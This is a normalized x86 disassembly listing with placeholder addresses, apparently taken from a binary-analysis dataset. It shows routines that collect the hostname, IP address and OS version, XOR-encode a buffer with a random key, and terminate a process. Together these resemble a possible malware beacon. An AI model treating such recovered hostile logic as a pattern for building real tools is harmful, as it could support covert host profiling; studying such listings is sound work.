jne r-xdata
sub eax esi
push eax
push edx
lea ecx [ esp + 0xfc ]
call sub_10009630
push 0x1
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0xfc ]
push ecx
call sub_10009040
mov edi eax
cmp edi 0xffffffff
je r-xdata
cmp [ esp + 0x108 ] 0x0
jbe r-xdata
push edi
xor ecx ecx
lea esi [ esp + 0x114 ]
lea edx [ esp + 0xf8 ]
call sub_10008b90
push 0xffffffff
lea ecx [ edi + 0x1 ]
lea esi [ esp + 0xdc ]
lea edx [ esp + 0xf8 ]
mov [ esp + 0x124c ] 0x2
call sub_10008b90
lea ecx [ esp + 0x110 ]
lea eax [ esp + 0x20 ]
mov [ esp + 0x1248 ] 0x3
call sub_100098f0
mov edi [ esp + 0x38 ]
mov esi eax
mov eax [ esp + 0x20 ]
mov [ esp + 0x4c ] esi
mov [ esp + 0x48 ] eax
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
add edx 0x200
lea eax [ esp + 0x1234 ]
mov [ esp + 0x18 ] edx
cmp edx eax
jb r-xdata
push 0x0
push r--data
lea ecx [ esp + 0xe0 ]
mov [ esp + 0xf8 ] 0xf
mov [ esp + 0xf4 ] 0x0
mov [ esp + 0xe4 ] 0x0
call sub_10009630
lea eax [ esp + 0xd8 ]
push eax
lea ecx [ esp + 0xf8 ]
push ecx
lea edx [ esp + 0xa8 ]
push edx
mov [ esp + 0x1254 ] 0x6
call sub_10008e40
lea ecx [ esp + 0x50 ]
push ecx
mov edi eax
mov [ esp + 0x124c ] 0x7
call sub_1000a260
lea edx [ esp + 0x50 ]
push edx
lea eax [ esp + 0x98 ]
push eax
lea ecx [ esp + 0x28 ]
push ecx
mov [ esp + 0x1254 ] 0x8
call sub_10008bc0
lea edx [ esp + 0x50 ]
push edx
mov [ esp + 0x124c ] 0x7
call sub_10004100
lea eax [ esp + 0xa0 ]
push eax
mov [ esp + 0x124c ] 0x6
call sub_10004100
mov [ esp + 0x1248 ] 0x1
cmp [ esp + 0xf0 ] ebx
jb r-xdata
cmp esi edi
je r-xdata
call sub_1000d90c
push 0x3
push r--data
lea ecx [ esp + 0xe0 ]
mov [ esp + 0xf8 ] 0xf
mov [ esp + 0xf4 ] 0x0
mov [ esp + 0xe4 ] 0x0
call sub_10009630
lea ecx [ esp + 0xd8 ]
push ecx
lea edx [ esp + 0x44 ]
push edx
lea esi [ esp + 0x28 ]
mov [ esp + 0x1250 ] 0x9
call sub_10008d90
mov edi [ eax ]
mov esi [ eax + 0x4 ]
mov ebx [ esp + 0x38 ]
test edi edi
je r-xdata
mov ecx [ esp + 0xdc ]
push ecx
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x38 ]
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] edx
lea eax [ esp + 0x40 ]
mov edi [ esi + 0x20 ]
cmp [ esi + 0x24 ] ebx
jb r-xdata
call sub_1000d90c
cmp edi [ esp + 0x20 ]
je r-xdata
call sub_1000d90c
cmp esi [ esp + 0x20 ]
je r-xdata
add esi 0x10
mov esi [ esi + 0x10 ]
jmp r-xdata
test bl bl
je r-xdata
mov eax [ esp + 0xdc ]
push eax
call sub_1000c4b4
add esp 0x4
cmp esi ebx
sete bl
mov [ esp + 0x1248 ] 0x1
cmp [ esp + 0xf0 ] 0x10
jb r-xdata
lea eax [ esp + 0xd8 ]
push eax
lea ecx [ esp + 0x114 ]
push ecx
lea edx [ esp + 0xa8 ]
push edx
call sub_10008e40
lea ecx [ esp + 0x50 ]
push ecx
mov edi eax
mov [ esp + 0x124c ] 0x4
call sub_1000a260
lea edx [ esp + 0x50 ]
push edx
lea eax [ esp + 0x8c ]
push eax
lea ecx [ esp + 0x28 ]
push ecx
mov [ esp + 0x1254 ] 0x5
call sub_10008bc0
lea edx [ esp + 0x50 ]
push edx
mov [ esp + 0x124c ] 0x4
call sub_10004100
lea eax [ esp + 0xa0 ]
push eax
mov [ esp + 0x124c ] 0x3
call sub_10004100
test esi esi
jne r-xdata
cmp edi ebx
je r-xdata
cmp [ esp + 0x128 ] 0x10
mov edx [ esp + 0x114 ]
jae r-xdata
mov eax edi
mov ebx [ esp + 0x124 ]
mov eax ebx
cmp ebx edi
jb r-xdata
test edi edi
jne r-xdata
mov [ esp + 0x1248 ] 0x0
cmp [ esp + 0x10c ] 0x10
jb r-xdata
mov [ esp + 0x1248 ] 0x1
mov [ esp + 0xf0 ] 0xf
mov [ esp + 0xec ] 0x0
mov [ esp + 0xdc ] 0x0
cmp [ esp + 0x128 ] esi
jb r-xdata
mov ecx [ esp + 0xdc ]
push ecx
call sub_1000c4b4
add esp 0x4
mov esi [ esi ]
jmp r-xdata
call sub_1000d90c
mov ecx esi
call sub_100023d0
test eax eax
jne r-xdata
lea edx [ esp + 0x114 ]
mov eax [ edi ]
jmp r-xdata
call sub_1000d90c
xor eax eax
mov [ esp + 0x10c ] 0xf
mov [ esp + 0x108 ] 0x0
mov [ esp + 0xf8 ] 0x0
mov ecx [ esp + 0xf8 ]
push ecx
call sub_1000c4b4
add esp 0x4
mov edx [ esp + 0x114 ]
push edx
jmp r-xdata
cmp edi [ esi + 0x18 ]
jne r-xdata
push 0xffffffff
push 0x0
lea edx [ esp + 0xe0 ]
lea ecx [ edi + 0x28 ]
push edx
call sub_10008f60
jmp r-xdata
call sub_1000d90c
jl r-xdata
cmp ebx edi
jb r-xdata
cmp esi [ eax + 0x18 ]
jne r-xdata
cmp [ esi + 0x40 ] 0x10
jb r-xdata
call sub_1000d90c
call sub_1000c4b4
add esp 0x4
mov esi 0x10
mov [ esp + 0x1248 ] 0x2
cmp [ esp + 0xf0 ] esi
jb r-xdata
lea eax [ esp + 0x48 ]
jmp r-xdata
cmp ebx edi
setne al
test eax eax
lea eax [ esi + 0x2c ]
mov eax [ esi + 0x2c ]
jmp r-xdata
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ebx [ esp + 0x38 ]
test esi esi
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov ebx eax
test edi edi
jne r-xdata
lea edx [ eax + 0x1 ]
mov edi [ edi ]
jmp r-xdata
call sub_1000d90c
cmp esi [ edi + 0x18 ]
jne r-xdata
cmp [ esi + 0x40 ] 0x10
jb r-xdata
call sub_1000d90c
add esi 0x2c
mov esi [ esi + 0x2c ]
jmp r-xdata
call sub_1000d90c
cmp esi [ esp + 0x20 ]
je r-xdata
push ebx
push esi
push rw-data
call sub_100109a0
add esp 0xc
push 0x3
push r--data
lea ecx [ esp + 0xe0 ]
mov [ esp + 0xf8 ] 0xf
mov [ esp + 0xf4 ] 0x0
mov [ esp + 0xe4 ] 0x0
call sub_10009630
lea eax [ esp + 0xd8 ]
push eax
lea ecx [ esp + 0x44 ]
push ecx
lea esi [ esp + 0x28 ]
mov [ esp + 0x1250 ] 0xa
call sub_10008d90
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ebx [ esp + 0x38 ]
test esi esi
je r-xdata
test bl bl
je r-xdata
mov edx [ esp + 0xdc ]
push edx
call sub_1000c4b4
add esp 0x4
cmp edi ebx
sete bl
mov [ esp + 0x1248 ] 0x1
cmp [ esp + 0xf0 ] 0x10
jb r-xdata
test esi esi
jne r-xdata
mov [ esp + 0x1248 ] 0x0
cmp [ esp + 0x10c ] 0x10
jb r-xdata
mov eax [ esi ]
jmp r-xdata
call sub_1000d90c
xor eax eax
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x110 ] 0xf
mov [ esp + 0x10c ] 0x0
mov [ esp + 0xfc ] 0x0
mov [ esp + 0x124c ] 0xffffffff
call sub_100040a0
xor eax eax
jmp r-xdata
mov eax [ esp + 0xf8 ]
push eax
call sub_1000c4b4
add esp 0x4
cmp edi [ eax + 0x18 ]
jne r-xdata
cmp [ edi + 0x40 ] 0x10
jb r-xdata
call sub_1000d90c
lea eax [ edi + 0x2c ]
mov eax [ edi + 0x2c ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov ebx eax
test esi esi
jne r-xdata
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov esi [ esi ]
jmp r-xdata
call sub_1000d90c
cmp edi [ esi + 0x18 ]
jne r-xdata
cmp [ edi + 0x40 ] 0x10
jb r-xdata
call sub_1000d90c
add edi 0x2c
mov edi [ edi + 0x2c ]
jmp r-xdata
call sub_1000d90c
cmp ecx [ esp + 0x20 ]
je r-xdata
push ebx
push edi
push rw-data
call sub_100109a0
add esp 0xc
push r--data
lea ecx [ esp + 0xdc ]
call sub_10008b20
lea edx [ esp + 0xd8 ]
push edx
lea eax [ esp + 0x44 ]
push eax
lea esi [ esp + 0x28 ]
mov [ esp + 0x1250 ] 0xb
call sub_10008d90
mov ecx [ eax ]
mov esi [ eax + 0x4 ]
mov edi [ esp + 0x38 ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] esi
test ecx ecx
je r-xdata
test bl bl
je r-xdata
mov ecx [ esp + 0xdc ]
push ecx
call sub_1000c4b4
add esp 0x4
cmp esi edi
mov edi 0x10
sete bl
mov [ esp + 0x1248 ] 0x1
cmp [ esp + 0xf0 ] edi
jb r-xdata
lea esi [ esp + 0x18 ]
call sub_10008e10
add eax 0x1c
cmp [ eax + 0x18 ] edi
jb r-xdata
lea ecx [ esp + 0xf4 ]
mov [ esp + 0x1248 ] 0x0
call sub_10008b60
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
lea edx [ esp + 0x20 ]
push edx
mov [ esp + 0x124c ] 0xffffffff
call sub_100040a0
xor eax eax
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea esi [ esp + 0x18 ]
mov edi eax
call sub_10008e10
add eax 0x1c
cmp [ eax + 0x18 ] 0x10
jb r-xdata
lea edx [ eax + 0x1 ]
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
call sub_1000d90c
cmp ecx [ esp + 0x20 ]
je r-xdata
push edi
push eax
push rw-data
call sub_100109a0
add esp 0xc
push r--data
lea ecx [ esp + 0xdc ]
call sub_10008b20
lea eax [ esp + 0xd8 ]
push eax
lea ecx [ esp + 0x44 ]
push ecx
lea esi [ esp + 0x28 ]
mov [ esp + 0x1250 ] 0xc
call sub_10008d90
mov ecx [ eax ]
mov esi [ eax + 0x4 ]
mov edi [ esp + 0x38 ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] esi
test ecx ecx
je r-xdata
push r--data
lea ecx [ esp + 0xdc ]
call sub_10008b20
lea edx [ esp + 0xd8 ]
push edx
lea eax [ esp + 0x44 ]
push eax
lea esi [ esp + 0x28 ]
mov [ esp + 0x1250 ] 0xd
call sub_10008d90
mov ecx [ eax ]
mov esi [ eax + 0x4 ]
mov edi [ esp + 0x38 ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] esi
test ecx ecx
je r-xdata
lea esi [ esp + 0x18 ]
call sub_10008e10
add eax 0x1c
mov ebx 0x10
cmp [ eax + 0x18 ] ebx
jb r-xdata
cmp esi edi
lea ecx [ esp + 0xd8 ]
setne bl
mov [ esp + 0x1248 ] 0x1
call sub_10008b60
test bl bl
je r-xdata
call sub_1000d90c
cmp ecx [ esp + 0x20 ]
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push r--data
lea ecx [ esp + 0xdc ]
call sub_10008b20
lea ecx [ esp + 0xd8 ]
push ecx
lea edx [ esp + 0x44 ]
push edx
lea esi [ esp + 0x28 ]
mov [ esp + 0x1250 ] 0xe
call sub_10008d90
mov ecx [ eax ]
mov esi [ eax + 0x4 ]
mov edi [ esp + 0x38 ]
test ecx ecx
je r-xdata
lea esi [ esp + 0x18 ]
call sub_10008e10
add eax 0x1c
mov ebx 0x10
cmp [ eax + 0x18 ] ebx
jb r-xdata
cmp esi edi
lea ecx [ esp + 0xd8 ]
setne bl
mov [ esp + 0x1248 ] 0x1
call sub_10008b60
test bl bl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea esi [ esp + 0x18 ]
mov edi eax
call sub_10008e10
add eax 0x1c
cmp [ eax + 0x18 ] ebx
jb r-xdata
lea edx [ eax + 0x1 ]
call sub_1000d90c
cmp ecx [ esp + 0x20 ]
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
lea ecx [ esp + 0xf4 ]
mov [ esp + 0x1248 ] 0x0
call sub_10008b60
lea eax [ esp + 0x20 ]
push eax
mov [ esp + 0x124c ] 0xffffffff
call sub_100040a0
mov eax 0x1
mov [ rw-data ] 0x1
cmp esi edi
lea ecx [ esp + 0xd8 ]
setne bl
mov [ esp + 0x1248 ] 0x1
call sub_10008b60
test bl bl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea esi [ esp + 0x18 ]
mov edi eax
call sub_10008e10
add eax 0x1c
cmp [ eax + 0x18 ] ebx
jb r-xdata
lea edx [ eax + 0x1 ]
push edi
push eax
push rw-data
call sub_100109a0
add esp 0xc
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push edi
push eax
push rw-data
call sub_100109a0
add esp 0xc
sub_100040a0
push 0xffffffff
push sub_1001dea8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x1c ]
mov [ esp + 0x14 ] 0x0
call sub_10009460
mov [ esp + 0x14 ] 0xffffffff
mov eax [ esi ]
push eax
call sub_1000c4b4
add esp 0x4
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn 0x4
sub_10004100
push 0xffffffff
push sub_1001dc78
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x1c ]
xor ebx ebx
mov [ esp + 0x14 ] ebx
cmp [ esi + 0x34 ] 0x10
jb r-xdata
mov [ esi + 0x34 ] 0xf
mov [ esi + 0x30 ] ebx
mov [ esi + 0x20 ] bl
mov [ esp + 0x14 ] 0xffffffff
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax [ esi + 0x20 ]
push eax
call sub_1000c4b4
add esp 0x4
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esi + 0x4 ] bl
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
add esp 0xc
retn 0x4
mov eax [ esi + 0x4 ]
push eax
call sub_1000c4b4
add esp 0x4
sub_10004190
push 0xffffffff
push sub_1001e1a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x160
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x15c ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x170 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push 0x3f
lea eax [ esp + 0x131 ]
push ebx
push eax
mov [ esp + 0x138 ] bl
call sub_1000fe10
xor eax eax
add esp 0xc
lea ecx [ esp + 0x30 ]
push ecx
mov [ esp + 0x110 ] bl
mov [ esp + 0x111 ] eax
mov [ esp + 0x115 ] eax
mov [ esp + 0x119 ] eax
mov [ esp + 0x11d ] eax
mov [ esp + 0x121 ] eax
mov [ esp + 0x125 ] eax
mov [ esp + 0x129 ] eax
mov [ esp + 0x12d ] ax
mov [ esp + 0x12f ] al
call sub_1000a9b0
push 0x40
lea edx [ esp + 0x130 ]
push edx
mov [ esp + 0x180 ] ebx
call gethostname
lea eax [ esp + 0x12c ]
push eax
call gethostbyname
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call inet_ntoa
lea ecx [ esp + 0x6c ]
push ecx
mov esi eax
mov [ esp + 0x70 ] 0x9c
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_1000def1
add esp 0x4
push eax
call sub_1000db26
add esp 0x4
push 0x10
push rw-data
call sub_1000db38
cdq
mov ecx 0x7a120
idiv ecx
push edx
call sub_1001c7f2
add esp 0xc
push ebx
push r--data
lea ecx [ esp + 0x1c ]
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] ebx
mov [ esp + 0x20 ] bl
call sub_10009630
mov [ esp + 0x178 ] 0x1
cmp [ esp + 0x28 ] ebx
je r-xdata
mov [ esp + 0x107 ] 0xff
push 0x4
push r--data
lea eax [ esp + 0x1c ]
call sub_10009520
push 0x1
push r--data
lea eax [ esp + 0x1c ]
call sub_10009520
lea eax [ esp + 0x12c ]
lea edx [ eax + 0x1 ]
push 0x1
push r--data
lea eax [ esp + 0x1c ]
call sub_10009520
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x130 ]
push edx
lea eax [ esp + 0x1c ]
call sub_10009520
cmp [ esp + 0x28 ] ebx
je r-xdata
push 0x4
push r--data
lea eax [ esp + 0x1c ]
call sub_10009520
push 0x1
push r--data
lea eax [ esp + 0x1c ]
call sub_10009520
mov eax esi
lea edx [ eax + 0x1 ]
push 0x1
push r--data
lea eax [ esp + 0x1c ]
call sub_10009520
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea eax [ esp + 0x1c ]
call sub_10009520
cmp [ esp + 0x28 ] ebx
je r-xdata
push 0x4
push r--data
lea eax [ esp + 0x1c ]
call sub_10009520
push 0x1
push r--data
lea eax [ esp + 0x1c ]
call sub_10009520
mov eax rw-data
lea edx [ eax + 0x1 ]
push 0x1
push r--data
lea eax [ esp + 0x1c ]
call sub_10009520
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push rw-data
lea eax [ esp + 0x1c ]
call sub_10009520
mov eax [ esp + 0x74 ]
mov ecx [ esp + 0x70 ]
push eax
push ecx
lea edx [ esp + 0x114 ]
push r--data
push edx
call sub_1000d12a
add esp 0x10
cmp [ esp + 0x28 ] ebx
je r-xdata
push 0x3
push r--data
lea eax [ esp + 0x1c ]
call sub_10009520
push 0x1
push r--data
lea eax [ esp + 0x1c ]
call sub_10009520
lea eax [ esp + 0x10c ]
lea edx [ eax + 0x1 ]
nop
push 0x1
push r--data
lea eax [ esp + 0x1c ]
call sub_10009520
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x110 ]
push eax
lea eax [ esp + 0x1c ]
call sub_10009520
cmp [ esp + 0x28 ] ebx
je r-xdata
push 0x4
push r--data
lea eax [ esp + 0x1c ]
call sub_10009520
push 0x1
push r--data
lea eax [ esp + 0x1c ]
call sub_10009520
mov eax rw-data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
push 0x1
push r--data
lea eax [ esp + 0x1c ]
call sub_10009520
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push rw-data
lea eax [ esp + 0x1c ]
call sub_10009520
mov esi [ esp + 0x2c ]
mov edi [ esp + 0x18 ]
mov eax edi
cmp esi 0x10
jae r-xdata
mov ecx [ esp + 0x28 ]
push ecx
push eax
push rw-data
call sub_100109a0
add esp 0xc
mov [ esp + 0x178 ] bl
cmp esi 0x10
jb r-xdata
lea eax [ esp + 0x18 ]
lea edx [ esp + 0x30 ]
push edx
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
mov [ esp + 0x17c ] 0xffffffff
call sub_1000aa40
mov ecx [ esp + 0x170 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x15c ]
xor ecx esp
call sub_1000c0a5
add esp 0x16c
retn
push edi
call sub_1000c4b4
add esp 0x4
sub_10004540
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov eax edi
lea edx [ eax + 0x1 ]
lea esp [ esp ]
push 0x1
push r--data
mov eax esi
call sub_10009520
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
mov eax esi
call sub_10009520
push 0x1
push r--data
mov eax esi
call sub_10009520
mov eax ebx
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push ebx
mov eax esi
call sub_10009520
retn
sub_100045a0
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
xor eax eax
mov [ esp ] 0x0
mov [ esp + 0x1 ] eax
mov [ esp + 0x5 ] eax
mov [ esp + 0x9 ] eax
mov [ esp + 0xd ] ax
mov [ esp + 0xf ] al
test ecx ecx
jne r-xdata
push 0xa
lea edx [ esp + 0x4 ]
push edx
push ecx
call sub_1001c7f2
add esp 0xc
push ecx
call sub_1000def1
push eax
call sub_1000db26
call sub_1000db38
cdq
mov ecx 0x1e8480
idiv ecx
push 0xa
lea eax [ esp + 0xc ]
push eax
add edx 0x3515
push edx
call sub_1001c7f2
add esp 0x14
jmp r-xdata
mov eax edi
lea edx [ eax + 0x1 ]
push 0x1
push r--data
mov eax esi
call sub_10009520
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
mov eax esi
call sub_10009520
push 0x1
push r--data
mov eax esi
call sub_10009520
lea eax [ esp ]
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_10009520
mov ecx [ esp + 0x10 ]
xor ecx esp
call sub_1000c0a5
add esp 0x14
retn
sub_10004680
push 0xffffffff
push sub_1001e156
mov eax [ fs : 0x0 ]
push eax
sub esp 0x46c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x468 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x480 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x490 ]
mov ebp [ esp + 0x494 ]
xor esi esi
push esi
push r--data
lea ecx [ esp + 0x20 ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] esi
mov [ esp + 0x24 ] 0x0
call sub_10009630
mov [ esp + 0x488 ] esi
cmp [ esp + 0x2c ] esi
je r-xdata
push 0x4
push r--data
lea eax [ esp + 0x20 ]
call sub_10009520
push 0x1
push r--data
lea eax [ esp + 0x20 ]
call sub_10009520
push 0x2
push r--data
lea eax [ esp + 0x20 ]
call sub_10009520
push esi
call sub_1000def1
push eax
call sub_1000db26
add esp 0x8
call sub_1000db38
cdq
mov ecx 0xf4240
idiv ecx
mov ebx 0x59e074
mov edi r--data
lea esi [ esp + 0x18 ]
add edx 0x1e8480
mov ecx edx
sub ebx edx
call sub_100045a0
mov ecx ebx
mov edi r--data
call sub_100045a0
test ebp ebp
je r-xdata
push 0x1
push r--data
lea eax [ esp + 0x20 ]
call sub_10009520
push 0x3ff
lea edx [ esp + 0x81 ]
push 0x0
push edx
mov [ esp + 0x88 ] 0x0
call sub_1000fe10
call sub_1000db38
cdq
mov ecx 0x7f
idiv ecx
lea esi [ esp + 0x88 ]
mov edi edx
sub edi 0xffffff80
push edi
call sub_10004a30
add esp 0x10
cmp [ esp + 0x2c ] 0x0
je r-xdata
cmp [ esp + 0x2c ] 0x0
je r-xdata
push 0x4
push r--data
lea eax [ esp + 0x20 ]
call sub_10009520
push 0x1
push r--data
lea eax [ esp + 0x20 ]
call sub_10009520
lea eax [ esp + 0x7c ]
lea edx [ eax + 0x1 ]
push 0x1
push r--data
lea eax [ esp + 0x20 ]
call sub_10009520
push 0x4
push r--data
lea eax [ esp + 0x20 ]
call sub_10009520
push 0x1
push r--data
lea eax [ esp + 0x20 ]
call sub_10009520
mov eax ebp
lea edx [ eax + 0x1 ]
nop
push 0x1
push r--data
mov eax esi
call sub_10009520
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x80 ]
push edx
lea eax [ esp + 0x20 ]
call sub_10009520
mov ecx edi
mov edi r--data
lea esi [ esp + 0x18 ]
call sub_100045a0
xor eax eax
mov [ esp + 0x6d ] eax
mov [ esp + 0x71 ] eax
mov [ esp + 0x75 ] eax
mov [ esp + 0x79 ] ax
mov [ esp + 0x7b ] al
lea eax [ esp + 0x6c ]
push 0xa
push eax
mov [ esp + 0x74 ] 0x0
call sub_1000db38
cdq
mov ecx 0x1388
idiv ecx
add edx 0x3e8
push edx
call sub_1001c7f2
add esp 0xc
push 0xe
push r--data
lea ecx [ esp + 0x3c ]
mov [ esp + 0x54 ] 0xf
mov [ esp + 0x50 ] 0x0
mov [ esp + 0x40 ] 0x0
call sub_10009630
lea eax [ esp + 0x6c ]
mov [ esp + 0x488 ] 0x1
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push ebp
lea eax [ esp + 0x20 ]
call sub_10009520
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x70 ]
push edx
lea eax [ esp + 0x3c ]
call sub_10009520
mov ebx [ esp + 0x1c ]
mov ebp 0x10
cmp [ esp + 0x30 ] ebp
jae r-xdata
mov eax [ esp + 0x38 ]
cmp [ esp + 0x4c ] ebp
jae r-xdata
lea ebx [ esp + 0x1c ]
push eax
xor edi edi
lea esi [ esp + 0x54 ]
call sub_10004ad0
mov eax [ esp + 0x58 ]
add esp 0x4
cmp [ esp + 0x68 ] ebp
jae r-xdata
lea eax [ esp + 0x38 ]
mov esi [ esp + 0x14 ]
mov ebx r--data
call sub_1000bc40
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov [ esi + 0x1420c ] 0x5
cmp [ esp + 0x68 ] ebp
jb r-xdata
lea eax [ esp + 0x54 ]
xor ebx ebx
mov esi 0xf
mov [ esp + 0x488 ] bl
mov [ esp + 0x68 ] esi
mov [ esp + 0x64 ] ebx
mov [ esp + 0x54 ] bl
cmp [ esp + 0x4c ] ebp
jb r-xdata
mov eax [ esp + 0x54 ]
push eax
call sub_1000c4b4
add esp 0x4
mov [ esp + 0x488 ] 0xffffffff
mov [ esp + 0x4c ] esi
mov [ esp + 0x48 ] ebx
mov [ esp + 0x38 ] bl
cmp [ esp + 0x30 ] ebp
jb r-xdata
mov ecx [ esp + 0x38 ]
push ecx
call sub_1000c4b4
add esp 0x4
mov ecx [ esp + 0x480 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x468 ]
xor ecx esp
call sub_1000c0a5
add esp 0x478
retn
mov edx [ esp + 0x1c ]
push edx
call sub_1000c4b4
add esp 0x4
sub_10004a30
sub esp 0x804
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x800 ] eax
push ebx
mov bl [ esp + 0x80c ]
push 0x7ff
lea eax [ esp + 0x9 ]
push 0x0
push eax
mov [ esp + 0x10 ] 0x0
call sub_1000fe10
add esp 0xc
xor eax eax
jmp r-xdata
mov cl [ eax + rw-data ]
mov [ esp + eax + 0x4 ] cl
inc eax
test cl cl
jne r-xdata
lea eax [ esp + 0x4 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov ecx eax
mov eax 0x0
je r-xdata
push ecx
lea ecx [ esp + 0x8 ]
mov edx esi
call sub_10002640
mov ecx [ esp + 0x808 ]
add esp 0x4
pop ebx
xor ecx esp
call sub_1000c0a5
add esp 0x804
retn
xor [ esp + eax + 0x4 ] bl
inc eax
cmp eax ecx
jb r-xdata
sub_10004ad0
sub esp 0x408
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x404 ] eax
push ebp
mov ebp [ esp + 0x410 ]
push 0x3ff
lea eax [ esp + 0xd ]
push 0x0
push eax
mov [ esp + 0x10 ] 0x0
mov [ esp + 0x14 ] 0x0
call sub_1000fe10
add esp 0xc
push ebx
test edi edi
jne r-xdata
push edi
push ebp
lea edx [ esp + 0x14 ]
push r--data
push edx
call sub_1000d12a
add esp 0x14
push ebp
lea ecx [ esp + 0x10 ]
push r--data
push ecx
call sub_1000d12a
add esp 0x10
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
call sub_10009630
mov ecx [ esp + 0x404 ]
xor ecx esp
mov eax esi
call sub_1000c0a5
add esp 0x408
retn
lea eax [ esp + 0x8 ]
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
pop ebp
sub_10004b90
mov eax [ rw-data ]
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
mov eax [ rw-data ]
mov esi [ CloseHandle@IAT ]
cmp eax edi
je r-xdata
push edi
push eax
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
mov [ rw-data ] edi
mov [ rw-data ] edi
mov eax [ rw-data ]
push edi
push eax
call [ TerminateProcess@IAT ]
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
mov [ rw-data ] edi
